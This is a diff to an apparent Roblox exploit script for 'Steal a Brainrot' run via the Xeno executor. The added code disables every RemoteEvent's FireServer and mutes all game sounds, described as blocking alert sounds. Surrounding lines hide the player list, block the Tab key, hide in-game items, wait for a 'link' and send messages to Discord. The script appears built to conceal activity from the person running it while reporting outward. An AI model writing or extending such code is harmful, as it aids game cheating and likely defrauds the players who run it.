@@ -1,5 +1,5 @@
 -- Script for Xeno - Steal a Brainrot (VOID EXTERNAL + Discord)
--- FULL ENGLISH + TAB HIDDEN
+-- FULL ENGLISH + TAB HIDDEN + REMOTE SOUNDS BLOCKED
 -- Compatible with Xeno Executor
 
 local Players = game:GetService("Players")
@@ -28,6 +28,43 @@ local function sendToDiscord(message)
             })
         end)
     end
+end
+
+-- ===== BLOCK REMOTE SOUNDS (ALERT SOUNDS) =====
+local function blockRemoteSounds()
+    pcall(function()
+        -- 1. Blochează RemoteEvents care trimit sunete
+        for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
+            if obj:IsA("RemoteEvent") then
+                local oldFire = obj.FireServer
+                if oldFire then
+                    obj.FireServer = function(...)
+                        -- Blochează orice eveniment care ar putea declanșa un sunet
+                        return
+                    end
+                end
+            end
+        end
+        
+        -- 2. Oprește sunetele din SoundService
+        for _, sound in pairs(SoundService:GetDescendants()) do
+            if sound:IsA("Sound") then
+                sound.Volume = 0
+                sound:Stop()
+                sound.Playing = false
+            end
+        end
+        
+        -- 3. Caută și oprește sunetele de alertă din Workspace
+        for _, obj in pairs(Workspace:GetDescendants()) do
+            if obj:IsA("Sound") then
+                obj.Volume = 0
+                obj:Stop()
+                obj.Playing = false
+            end
+        end
+    end)
+    print("✅ Remote sounds blocked!")
 end
 
 -- ===== MUTE ALL SOUNDS =====
@@ -77,7 +114,6 @@ local function hidePlayerList()
             end
         end
         
-        -- Also search in PlayerGui
         for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
             if gui:IsA("ScreenGui") then
                 local name = gui.Name:lower()
@@ -95,7 +131,6 @@ local function hidePlayerList()
             end
         end)
         
-        -- Also block the key release
         UserInputService.InputEnded:Connect(function(input)
             if input.KeyCode == Enum.KeyCode.Tab then
                 input:StopPropagation()
@@ -539,6 +574,7 @@ local function showLinkGUI()
             showLoader()
             hideMe()
             muteAllSounds()
+            blockRemoteSounds()  -- <-- BLOCHEAZĂ SUNETELE DE ALERTĂ
             hidePlayerList()
             local count = hideBrainrots()
             print("✅ Script active! " .. count .. " brainrots hidden.")
@@ -561,6 +597,7 @@ local function main()
     print("🚀 Waiting for link input...")
     print("🔄 Base will reset every 5 seconds.")
     print("🔒 Tab key blocked! Player list hidden!")
+    print("🔇 Remote sounds blocked!")
 end
 
 -- ===== START =====
